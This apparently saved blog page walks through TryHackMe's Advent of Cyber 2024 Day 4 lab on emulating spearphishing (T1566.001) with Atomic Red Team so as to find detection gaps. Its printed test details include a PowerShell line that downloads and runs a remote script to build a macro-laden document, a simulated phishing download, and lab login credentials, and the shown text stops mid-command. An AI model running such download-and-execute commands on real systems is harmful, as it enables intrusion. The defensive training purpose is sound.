@@ -1,0 +1,724 @@
+<!doctype html>
+<html>
+  <head>
+  <title>
+    
+      Try Hackme Advent of Cyber - Day 4 | THM Advent of Cyber 2024
+    
+  </title>
+  <meta name="viewport" content="width=device-width, initial-scale=1">
+  <meta charset="utf-8">
+  <link rel="stylesheet" href="/assets/css/main.css">
+  <link rel="stylesheet" href="/assets/css/syntax.css">
+  <!-- Use Atom -->
+  <link type="application/atom+xml" rel="alternate" href="http://localhost:4000/feed.xml" title="THM Advent of Cyber 2024" />
+  <!-- RSS-v2.0
+  <link href="/rss-feed.xml" type="application/rss+xml" rel="alternate" title="THM Advent of Cyber 2024 | a minimalist Jekyll theme for running a blog or publication"/>
+  //-->
+  <link rel="stylesheet" href="https://fonts.googleapis.com/css?family=Roboto|Source+Code+Pro">
+  <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.6.3/css/font-awesome.min.css">
+  <script type="text/javascript" async
+    src="https://cdnjs.cloudflare.com/ajax/libs/mathjax/2.7.5/MathJax.js?config=TeX-MML-AM_CHTML">
+  </script>
+  <!-- Google Analytics -->
+  <script>
+  (function(i,s,o,g,r,a,m){i['GoogleAnalyticsObject']=r;i[r]=i[r]||function(){
+  (i[r].q=i[r].q||[]).push(arguments)},i[r].l=1*new Date();a=s.createElement(o),
+  m=s.getElementsByTagName(o)[0];a.async=1;a.src=g;m.parentNode.insertBefore(a,m)
+  })(window,document,'script','//www.google-analytics.com/analytics.js','ga');
+  ga('create', '', 'auto');
+  ga('send', 'pageview');
+</script>
+
+  <!-- Use Jekyll SEO plugin -->
+  <!-- Begin Jekyll SEO tag v2.8.0 -->
+<title>Try Hackme Advent of Cyber - Day 4 | THM Advent of Cyber 2024</title>
+<meta name="generator" content="Jekyll v4.3.4" />
+<meta property="og:title" content="Try Hackme Advent of Cyber - Day 4" />
+<meta name="author" content="Michael" />
+<meta property="og:locale" content="en_US" />
+<meta name="description" content="Based on the eventSource field, what AWS service generates the ConsoleLogin event?Day 4" />
+<meta property="og:description" content="Based on the eventSource field, what AWS service generates the ConsoleLogin event?Day 4" />
+<link rel="canonical" href="http://localhost:4000/Day4" />
+<meta property="og:url" content="http://localhost:4000/Day4" />
+<meta property="og:site_name" content="THM Advent of Cyber 2024" />
+<meta property="og:image" content="http://localhost:4000/Day4-logo.png" />
+<meta property="og:type" content="article" />
+<meta property="article:published_time" content="2024-12-04T00:00:00-05:00" />
+<meta name="twitter:card" content="summary_large_image" />
+<meta property="twitter:image" content="http://localhost:4000/Day4-logo.png" />
+<meta property="twitter:title" content="Try Hackme Advent of Cyber - Day 4" />
+<script type="application/ld+json">
+{"@context":"https://schema.org","@type":"BlogPosting","author":{"@type":"Person","name":"Michael"},"dateModified":"2024-12-04T00:00:00-05:00","datePublished":"2024-12-04T00:00:00-05:00","description":"Based on the eventSource field, what AWS service generates the ConsoleLogin event?Day 4","headline":"Try Hackme Advent of Cyber - Day 4","image":"http://localhost:4000/Day4-logo.png","mainEntityOfPage":{"@type":"WebPage","@id":"http://localhost:4000/Day4"},"url":"http://localhost:4000/Day4"}</script>
+<!-- End Jekyll SEO tag -->
+
+</head>
+
+  <body>
+    <div class="container">
+      <header class="site-header">
+  <h3 class="site-title">
+    <a href="/">THM Advent of Cyber 2024</a>
+  </h3>
+  <nav class="menu-list">
+    
+      <a href="/about" class="menu-link">About</a>
+    
+      <a href="/contact" class="menu-link">Contact</a>
+    
+    
+      <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+    
+      <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+    
+  </nav>
+  <div class="dropdown">
+    <button class="dropbtn"><i class="fa fa-bars" aria-hidden="true"></i></button>
+    <div class="dropdown-content">
+      
+        <a href="/about" class="menu-link">About</a>
+      
+        <a href="/contact" class="menu-link">Contact</a>
+      
+      
+        <a href="https://twitter.com/mberger" class="menu-link" target="_blank"><i class="fa fa-twitter" aria-hidden="true"></i></a>
+      
+        <a href="feed.xml" class="menu-link" target="_blank"><i class="fa fa-rss-square" aria-hidden="true"></i></a>
+      
+    </div>
+  </div>
+</header>
+
+      <div class="content-wrapper">
+        <div class="post-content">
+  <h1>
+    Try Hackme Advent of Cyber - Day 4
+  </h1>
+  
+    <span class="post-date">
+  Written on
+  
+  December
+  4th,
+  2024
+  by
+  
+    Michael
+  
+</span>
+
+  
+  
+    <div class="featured-image">
+      <img src="/assets/img/Day4-logo.png">
+    </div>
+  
+  <article>
+    <h1 id="based-on-the-eventsource-field-what-aws-service-generates-the-consolelogin-eventday-4">Based on the eventSource field, what AWS service generates the ConsoleLogin event?Day 4</h1>
+
+<p>NEW Advent of Cyber Task: Atomic Red Team</p>
+
+<table>
+  <tbody>
+    <tr>
+    </tr>
+  </tbody>
+</table>
+
+<p>| <a href="https://e.customeriomail.com/e/c/eyJlbWFpbF9pZCI6ImRnVEsxUVVEQUllb1hJYW9YQUdUa25Sb20yLU1HRjV2NVYyYXFjVT0iLCJocmVmIjoiaHR0cHM6Ly90cnloYWNrbWUuY29tL3Ivcm9vbS9hZHZlbnRvZmN5YmVyMjAyND91dG1fc291cmNlPWN1c3RvbWVyLmlvXHUwMDI2dXRtX21lZGl1bT1lbWFpbFx1MDAyNnV0bV9jYW1wYWlnbj1hb2MyMDI0XHUwMDI2dXRtX2NvbnRlbnQ9ZGFpbHlfZW1haWxzIiwiaW50ZXJuYWwiOiJjYWQ1MDUzMmE2NjE4N2E4NWMiLCJsaW5rX2lkIjoxNjA3MX0/c59d13aca270bd8f6c18df807c10003d69c3eca704f593e7aff7f84be0ffaff3">   <img src="https://ci3.googleusercontent.com/meips/ADKq_Nbm6h-hqqbF-A5NVyxCrIDJGj0BG7orq40mahoNZZ_PfgZMMsPQuc1TWGiJiulVgyJ9UnWSOVyT9hfse4n-AZBn3ZmOU3Fx0mvAE1yBD6-CRnHjercYx7oTnuWihhrzDF0KJsc85VuliA2St9Sv4c01hK2ix7s-d2hMnWRTlI8NI6-10yWpwZ4g32jxfmoYODJqgN1uGxdWRjJ0gy0W4lNK6ZqE3eMkC-4dJmAnNIY2jis0Jg8=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731327229375_THM%20AoC%202024%20Logo%20White%20-%20900x600px_01JCDJ9ZH8BYM6E9WYP0SE4SG0.png" alt="" />   <img src="https://ci3.googleusercontent.com/meips/ADKq_NY8fGR6GcJAU5Hr3kzU7Dywis5ly6JZVo25hyAI0gsuGLqseM_8Bv-6yWrJMBdUjkvqeAzErKgFNNCxEz_knrD1lP97E_RmJc-P_Mmlx4jYgo6i44Y4kqnX4qXlZEfuNh0uhuuA-HrOicIuo-I-P3HOPwKjNzBnDCy1N_GhB6EY0OHr5DKqCexmA1QrsoPfaivWVlhMQ6U3Rt1hzr18JbCGiseT=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731663353758_AoC%20Design%203%20-%20Day%204_01JCQJVPDQ7SQ98KAMAKH24E48.png" alt="TryHackMe" title="TryHackMe" /></a>**Advent of Cyber: New Task Release!**I’m all atomic inside!   <img src="https://ci3.googleusercontent.com/meips/ADKq_NaGOHzvuF4oS-3bY93UdCw0ZnvTiy38kdRQgWWxuhVgxQ5AaCLs2JseseR8bJ8OD_lOK8L8U530UV5GWZlWclNwFhqmsM8b-NtKF4q2ZmKooHrmpif067VhySjBNxjh53nkrGFlKxYpciFFLsmesIJYfIrbR4p-Rx8HtufmuiIvH5jLoeXk-p_rBGYCqBYtya-yDiinVupr817_WVVz1Lf3IYM52VGEWtR94xv6CFM=s0-d-e1-ft#https://userimg-assets.customeriomail.com/images/client-env-92874/1731663942745_Byte%20-%20AoC%20Character%20Card%20326px_01JCQKDNFEC53BWAVD6CH60XVA.png" alt="" />In day 4 of Advent of Cyber, the SOC team recreates Glitch’s steps and investigates breadcrumbs left by his security fixes. **Topics Covered:**Atomic Red Team |
+|—-|</p>
+
+<p>The Story</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/5fc2847e1bbebc03aa89fbf2/room-content/5fc2847e1bbebc03aa89fbf2-1730709355879.png" alt="Task banner for day DAY 4" /></p>
+
+<p>SOC-mas is approaching! And the town of Warewille started preparations for the grand event.</p>
+
+<p>Glitch, a quiet, talented security SOC-mas engineer, had a hunch that these year’s celebrations would be different. With looming threats, he decided to revamp the town’s security defences. Glitch began to fortify the town’s security defences quietly and meticulously. He started by implementing a protective firewall, patching vulnerabilities, and accessing endpoints to patch for security vulnerabilities. As he worked tirelessly, he left “breadcrumbs,” small traces of his activity.</p>
+
+<p>Unaware of Glitch’s good intentions, the SOC team spotted anomalies: Logs showing admin access, escalation of privileges, patched systems behaving differently, and security tools triggering alerts. The SOC team misinterpreted the system modifications as a sign of an insider threat or rogue attacker and decided to launch an investigation using the Atomic Red Team framework.</p>
+
+<p><img src="https://assets.tryhackme.com/additional/aoc2024/gifs/AoC-Day-4-Atomic-Red-Animation.gif" alt="a &quot;candy&quot; styled pill being added to the window of a gingerbread house" /> \n</p>
+
+<h2 id="learning-objectives">Learning Objectives</h2>
+
+<ul>
+  <li>Learn how to identify malicious techniques using the MITRE ATT&amp;CK framework.</li>
+  <li>Learn about how to use Atomic Red Team tests to conduct attack simulations.</li>
+  <li>Understand how to create alerting and detection rules from the attack tests.</li>
+</ul>
+
+<h2 id="connecting-to-the-machine">Connecting to the Machine</h2>
+
+<p>Before moving forward, review the questions in the connection card below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/66c44fd9733427ea1181ad58/room-content/66c44fd9733427ea1181ad58-1730733634851.png" alt="Banner showing the connection details for this room." /></p>
+
+<p>Click on the green <strong>Start Machine</strong> button below to start the virtual machine and wait 1-2 minutes for the system to boot completely in a split-screen view.</p>
+
+<p>If the virtual machine isn’t visible, use the blue <strong>Show Split View</strong> button at the top of the page.</p>
+
+<p>Additionally, if you wish to connect to the machine via RDP, use the credentials below:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/63588b5ef586912c7d03c4f0/room-content/be629720b11a294819516c1d4e738c92.png" alt="THM Key Credentials" /></p>
+
+<table>
+  <thead>
+    <tr>
+      <th><strong>Username</strong></th>
+      <th>Administrator</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><strong>Password</strong></td>
+      <td>Emulation101!</td>
+    </tr>
+    <tr>
+      <td><strong>IP</strong></td>
+      <td>MACHINE_IP</td>
+    </tr>
+  </tbody>
+</table>
+
+<p>The VM has Atomic Red Team and Sysmon installed. This will allow us to emulate an attack using TTPs described in the MITRE ATT&amp;CK framework.</p>
+
+<h2 id="detection-gaps">Detection Gaps</h2>
+
+<p>While it might be the utopian dream of every blue teamer, we will rarely be able to detect every attack or step in an attack kill chain. This is a reality that all blue teamers face: there are gaps in their detection. But worry not! These gaps do not have to be the size of black holes; there are things we can do to help make these gaps smaller.</p>
+
+<p>Detection gaps are usually for one of two main reasons:</p>
+
+<ul>
+  <li><strong>Security is a cat-and-mouse game.</strong> As we detect more, the threat actors and red teamers will find new sneaky ways to thwart our detection. We then need to study these novel techniques and update our signature and alert rules to detect these new techniques.</li>
+  <li><strong>The line between anomalous and expected behaviour is often very fine and sometimes even has significant overlap.</strong> For example, let’s say we are a company based in the US. We expect to see almost all of our logins come from IP addresses in the US. One day, we get a login event from an IP in the EU, which would be an anomaly. However, it could also be our CEO travelling for business. This is an example where normal and malicious behaviour intertwine, making it hard to create accurate detection rules that would not have too much noise.</li>
+</ul>
+
+<p>Blue teams constantly refine and improve their detection rules to close the gaps they experience due to the two reasons mentioned above. Let’s take a look at how this can be done!</p>
+
+<h2 id="cyber-attacks-and-the-kill-chain">Cyber Attacks and the Kill Chain</h2>
+
+<p>Before diving into creating new detection rules, we first have to discuss some key topics. The first topic to discuss is the Cyber Kill chain. All cyber attacks follow a fairly standard process, which is explained quite well by the Unified Cyber Kill chain:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/ddd4bddb2db2285c3e42eef4c35b6211.png" alt="The process flow of the Unified Kill chain." /> \n</p>
+
+<p>As a blue teamer, it would be our dream to prevent all attacks at the start of the kill chain. So even just when threat actors start their reconnaissance, we already stop them dead in their tracks. But, as discussed before, this is not possible. The goal then shifts slightly. If we are unable to fully detect and prevent a threat actor at any one phase in the kill chain, the goal becomes to perform detections across the entire kill chain in such a way that even if there are detection gaps in a single phase, the gap is covered in a later phase. The goal is, therefore, to ensure we can detect the threat actor before the very last phase of goal execution. \n</p>
+
+<h2 id="mitre-attck">MITRE ATT&amp;CK</h2>
+
+<p>A popular framework for understanding the different techniques and tactics that threat actors perform through the kill chain is the <a href="https://attack.mitre.org">MITRE ATT&amp;CK framework</a>. The framework is a collection of tactics, techniques, and procedures that have been seen to be implemented by real threat actors. The framework provides a <a href="https://mitre-attack.github.io/attack-navigator/">navigator tool</a> where these TTPs can be investigated:</p>
+
+<p><img src="https://tryhackme-images.s3.amazonaws.com/user-uploads/6093e17fa004d20049b6933e/room-content/6093e17fa004d20049b6933e-1730831075861.png" alt="The MITRE ATTACK&amp;CK navigator page." /></p>
+
+<p>However, the framework primarily discusses these TTPs in a theoretical manner. Even if we know we have a gap for a specific TTP, we don’t really know how to test the gap or close it down. This is where the Atomics come in!</p>
+
+<h2 id="atomic-red">Atomic Red</h2>
+
+<p>The Atomic Red Team library is a collection of red team test cases that are mapped to the MITRE ATT&amp;CK framework. The library consists of simple test cases that can be executed by any blue team to test for detection gaps and help close them down. The library also supports automation, where the techniques can be automatically executed. However, it is also possible to execute them manually.</p>
+
+<h2 id="dropping-the-atomic">Dropping the Atomic</h2>
+
+<p>McSkidy has a vague idea of what happened to the “compromised machine.” It seems someone tried to use the Atomic Red Team to emulate an attack on one of our systems without permission. The perpetrator also did not clean up the test artefacts. Let’s have a look at what happened.</p>
+
+<h2 id="running-an-atomic">Running an Atomic</h2>
+
+<p>McSkidy suspects that the supposed attacker used the MITRE ATT&amp;CK technique <a href="https://attack.mitre.org/techniques/T1566/001/">T1566.001 Spearphishing</a> with an attachment. Let’s recreate the attack emulation performed by the supposed attacker and then look for the artefacts created.</p>
+
+<p>Open up a PowerShell prompt as administrator and follow along with us. Let’s start by having a quick peek at the help page. Enter the command <code class="language-plaintext highlighter-rouge">Get-Help Invoke-Atomictest</code>. You should see the output below:</p>
+
+<p>Administrator: Windows PowerShell</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code><span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Get</span><span class="o">-</span><span class="nx">Help</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">Atomictest</span>
+<span class="nx">NAME</span>
+    <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span>
+
+<span class="nx">SYNTAX</span>
+    <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="p">[</span><span class="o">-</span><span class="nx">AtomicTechnique</span><span class="p">]</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span> <span class="p">[</span><span class="o">-</span><span class="nx">ShowDetails</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">ShowDetailsBrief</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">TestNumbers</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span>
+    <span class="p">[</span><span class="o">-</span><span class="nx">TestNames</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">TestGuids</span> <span class="o">&lt;</span><span class="nx">string</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">PathToAtomicsFolder</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">CheckPrereqs</span><span class="p">]</span>
+    <span class="p">[</span><span class="o">-</span><span class="nx">PromptForInputArgs</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">GetPrereqs</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Cleanup</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">NoExecutionLog</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">ExecutionLogPath</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Force</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">InputArgs</span><span class="o">&lt;</span><span class="nx">hashtable</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">TimeoutSeconds</span> <span class="o">&lt;</span><span class="nx">int</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Session</span> <span class="o">&lt;</span><span class="nx">PSSession</span><span class="p">[]</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Interactive</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">KeepStdOutStdErrFiles</span><span class="p">]</span>
+    <span class="p">[</span><span class="o">-</span><span class="nx">LoggingModule</span> <span class="o">&lt;</span><span class="nx">string</span><span class="o">&gt;</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">WhatIf</span><span class="p">]</span> <span class="p">[</span><span class="o">-</span><span class="nx">Confirm</span><span class="p">]</span>  <span class="p">[</span><span class="o">&lt;</span><span class="nx">CommonParameters</span><span class="o">&gt;</span><span class="p">]</span>
+
+<span class="nx">ALIASES</span>
+    <span class="nx">None</span>
+
+<span class="nx">REMARKS</span>
+    <span class="nx">None</span>
+</code></pre></div></div>
+
+<p>The help above only shows what parameters are available without any explanation. Even though most parameter names are self-explanatory, let us have a quick overview of the parameters we will use in this walkthrough:</p>
+
+<table>
+  <thead>
+    <tr>
+      <th>Parameter</th>
+      <th>Explanation</th>
+      <th>Example use</th>
+    </tr>
+  </thead>
+  <tbody>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Atomic Technique</code></td>
+      <td>This defines what technique you want to emulate. You can use the complete technique name or the “TXXXX” value. This flag can be omitted. \n</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest -AtomicTechnique T1566.001</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-ShowDetails</code></td>
+      <td>Shows the details of each test included in the Atomic.</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -ShowDetails</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-ShowDetailsBrief</code></td>
+      <td>Shows the title of each test included in the Atomic.</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -ShowDetailsBrief</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-CheckPrereqs</code></td>
+      <td>Provides a check if all necessary components are present for testing</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -CheckPrereqs</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-TestNames</code></td>
+      <td>Sets the tests you want to execute using the complete Atomic Test Name.</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNames "Download Macro-Enabled Phishing Attachment"</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-TestGuids</code></td>
+      <td>Sets the tests you want to execute using the unique test identifier.</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestGuids 114ccff9-ae6d-4547-9ead-4cd69f687306</code></td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-TestNumbers</code></td>
+      <td>Sets the tests you want to execute using the test number. The scope is limited to the Atomic Technique.</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 2,3</code> \n</td>
+    </tr>
+    <tr>
+      <td><code class="language-plaintext highlighter-rouge">-Cleanup</code></td>
+      <td>Run the cleanup commands that were configured to revert your machine state to normal.</td>
+      <td><code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -TestNumbers 2 -Cleanup</code></td>
+    </tr>
+  </tbody>
+</table>
+
+<p><strong>Our First Command</strong> \n We can build our first command now that we know which parameters are available. We would like to know more about what exactly happens when we test the Technique T1566.001. To get this information, we must include the name of the technique we want information about and then add the flag<code class="language-plaintext highlighter-rouge">-ShowDetails</code> to our command. Let’s have a look at the command we constructed: <code class="language-plaintext highlighter-rouge">Invoke-AtomicTest T1566.001 -ShowDetails</code>. This command displays the details of all tests included in the T1566.001 Atomic.</p>
+
+<p>Atomic Test T1566.001 Details</p>
+
+<div class="language-javascript highlighter-rouge"><div class="highlight"><pre class="highlight"><code> <span class="nx">PS</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Users</span><span class="err">\</span><span class="nx">Administrator</span><span class="o">&gt;</span> <span class="nx">Invoke</span><span class="o">-</span><span class="nx">AtomicTest</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span> <span class="o">-</span><span class="nx">ShowDetails</span>
+<span class="nx">PathToAtomicsFolder</span> <span class="o">=</span> <span class="nx">C</span><span class="p">:</span><span class="err">\</span><span class="nx">Tools</span><span class="err">\</span><span class="nx">AtomicRedTeam</span><span class="err">\</span><span class="nx">atomics</span>
+
+<span class="p">[</span><span class="o">********</span><span class="nx">BEGIN</span> <span class="nx">TEST</span><span class="o">*******</span><span class="p">]</span>
+<span class="nx">Technique</span><span class="p">:</span> <span class="nx">Phishing</span><span class="p">:</span> <span class="nx">Spearphishing</span> <span class="nx">Attachment</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span>
+<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">Name</span><span class="p">:</span> <span class="nx">Download</span> <span class="nx">Macro</span><span class="o">-</span><span class="nx">Enabled</span> <span class="nx">Phishing</span> <span class="nx">Attachment</span>
+<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nb">Number</span><span class="p">:</span> <span class="mi">1</span>
+<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">GUID</span><span class="p">:</span> <span class="mi">114</span><span class="nx">ccff9</span><span class="o">-</span><span class="nx">ae6d</span><span class="o">-</span><span class="mi">4547</span><span class="o">-</span><span class="mi">9</span><span class="nx">ead</span><span class="o">-</span><span class="mi">4</span><span class="nx">cd69f687306</span>
+<span class="nx">Description</span><span class="p">:</span> <span class="nx">This</span> <span class="nx">atomic</span> <span class="nx">test</span> <span class="nx">downloads</span> <span class="nx">a</span> <span class="nx">macro</span> <span class="nx">enabled</span> <span class="nb">document</span> <span class="k">from</span> <span class="nx">the</span> <span class="nx">Atomic</span> <span class="nx">Red</span> <span class="nx">Team</span> <span class="nx">GitHub</span> <span class="nx">repository</span><span class="p">,</span> <span class="nx">simulating</span>
+<span class="nx">an</span> <span class="nx">end</span> <span class="nx">user</span> <span class="nx">clicking</span> <span class="nx">a</span> <span class="nx">phishing</span> <span class="nx">link</span> <span class="nx">to</span> <span class="nx">download</span> <span class="nx">the</span> <span class="nx">file</span><span class="p">.</span> <span class="nx">The</span> <span class="nx">file</span> <span class="dl">"</span><span class="s2">PhishingAttachment.xlsm</span><span class="dl">"</span> <span class="nx">is</span> <span class="nx">downloaded</span> <span class="nx">to</span> <span class="nx">the</span> <span class="o">%</span><span class="nx">temp</span>
+<span class="o">%</span> <span class="nx">directory</span><span class="p">.</span>
+
+<span class="nx">Attack</span> <span class="nx">Commands</span><span class="p">:</span>
+<span class="nx">Executor</span><span class="p">:</span> <span class="nx">powershell</span>
+<span class="nx">ElevationRequired</span><span class="p">:</span> <span class="nx">False</span>
+<span class="nx">Command</span><span class="p">:</span>
+<span class="nx">$url</span> <span class="o">=</span> <span class="dl">'</span><span class="s1">http://localhost/PhishingAttachment.xlsm</span><span class="dl">'</span>
+<span class="nx">Invoke</span><span class="o">-</span><span class="nx">WebRequest</span> <span class="o">-</span><span class="nx">Uri</span> <span class="nx">$url</span> <span class="o">-</span><span class="nx">OutFile</span> <span class="nx">$env</span><span class="p">:</span><span class="nx">TEMP</span><span class="err">\</span><span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span>
+
+<span class="nx">Cleanup</span> <span class="nx">Commands</span><span class="p">:</span>
+<span class="nx">Command</span><span class="p">:</span>
+<span class="nx">Remove</span><span class="o">-</span><span class="nx">Item</span> <span class="nx">$env</span><span class="p">:</span><span class="nx">TEMP</span><span class="err">\</span><span class="nx">PhishingAttachment</span><span class="p">.</span><span class="nx">xlsm</span> <span class="o">-</span><span class="nx">ErrorAction</span> <span class="nx">Ignore</span>
+<span class="p">[</span><span class="o">!!!!!!!!</span><span class="nx">END</span> <span class="nx">TEST</span><span class="o">!!!!!!!</span><span class="p">]</span>
+
+
+<span class="p">[</span><span class="o">********</span><span class="nx">BEGIN</span> <span class="nx">TEST</span><span class="o">*******</span><span class="p">]</span>
+<span class="nx">Technique</span><span class="p">:</span> <span class="nx">Phishing</span><span class="p">:</span> <span class="nx">Spearphishing</span> <span class="nx">Attachment</span> <span class="nx">T1566</span><span class="p">.</span><span class="mi">001</span>
+<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">Name</span><span class="p">:</span> <span class="nx">Word</span> <span class="nx">spawned</span> <span class="nx">a</span> <span class="nx">command</span> <span class="nx">shell</span> <span class="nx">and</span> <span class="nx">used</span> <span class="nx">an</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">command</span> <span class="nx">line</span>
+<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nb">Number</span><span class="p">:</span> <span class="mi">2</span>
+<span class="nx">Atomic</span> <span class="nx">Test</span> <span class="nx">GUID</span><span class="p">:</span> <span class="nx">cbb6799a</span><span class="o">-</span><span class="mi">425</span><span class="nx">c</span><span class="o">-</span><span class="mi">4</span><span class="nx">f83</span><span class="o">-</span><span class="mi">9194</span><span class="o">-</span><span class="mi">5447</span><span class="nx">a909d67f</span>
+<span class="nx">Description</span><span class="p">:</span> <span class="nx">Word</span> <span class="nx">spawning</span> <span class="nx">a</span> <span class="nx">command</span> <span class="nx">prompt</span> <span class="nx">then</span> <span class="nx">running</span> <span class="nx">a</span> <span class="nx">command</span> <span class="kd">with</span> <span class="nx">an</span> <span class="nx">IP</span> <span class="nx">address</span> <span class="k">in</span> <span class="nx">the</span> <span class="nx">command</span> <span class="nx">line</span> <span class="nx">is</span> <span class="nx">an</span> <span class="nx">indiciat</span>
+<span class="nx">or</span> <span class="k">of</span> <span class="nx">malicious</span> <span class="nx">activity</span><span class="p">.</span> <span class="nx">Upon</span> <span class="nx">execution</span><span class="p">,</span> <span class="nx">CMD</span> <span class="nx">will</span> <span class="nx">be</span> <span class="nx">lauchned</span> <span class="nx">and</span> <span class="nx">ping</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span>
+
+<span class="nx">Attack</span> <span class="nx">Commands</span><span class="p">:</span>
+<span class="nx">Executor</span><span class="p">:</span> <span class="nx">powershell</span>
+<span class="nx">ElevationRequired</span><span class="p">:</span> <span class="nx">False</span>
+<span class="nx">Command</span><span class="p">:</span>
+<span class="p">[</span><span class="nx">Net</span><span class="p">.</span><span class="nx">ServicePointManager</span><span class="p">]::</span><span class="nx">SecurityProtocol</span> <span class="o">=</span> <span class="p">[</span><span class="nx">Net</span><span class="p">.</span><span class="nx">SecurityProtocolType</span><span class="p">]::</span><span class="nx">Tls12</span>
+<span class="nc">IEX </span><span class="p">(</span><span class="nx">iwr</span> <span class="dl">"</span><span class="s2">https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1</span><span class="dl">"</span> <span class="o">-</span><span class="nx">UseBasicParsing</span><span class="p">)</span>
+<span class="nx">$macrocode</span> <span class="o">=</span> <span class="dl">"</span><span class="s2">   Open `</span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">jse_path</span><span class="p">}</span><span class="s2">`" For Output As #1`</span><span class="nx">n</span>   <span class="nx">Write</span> <span class="err">#</span><span class="mi">1</span><span class="p">,</span> <span class="s2">`"WScript.Quit`</span><span class="dl">"</span><span class="s2">`n   Close #1`n   Shell`$ `</span><span class="dl">"</span><span class="nx">ping</span> <span class="mf">8.8</span><span class="p">.</span><span class="mf">8.8</span><span class="s2">`"`</span><span class="nx">n</span><span class="dl">"</span><span class="s2">
+Invoke-MalDoc -macroCode $macrocode -officeProduct </span><span class="dl">"</span><span class="err">#</span><span class="p">{</span><span class="nx">ms_product</span><span class="p">}</span><span class="dl">"</span><span class="s2">
+Command (with inputs):
+[Net.ServicePointManager]::SecurityProtocol = [Net.SecurityProtocolType]::Tls12
+IEX (iwr </span><span class="dl">"</span><span class="nx">https</span><span class="p">:</span><span class="c1">//raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1204.002/src/Invoke-MalDoc.ps1" -UseBasicParsing)</span>
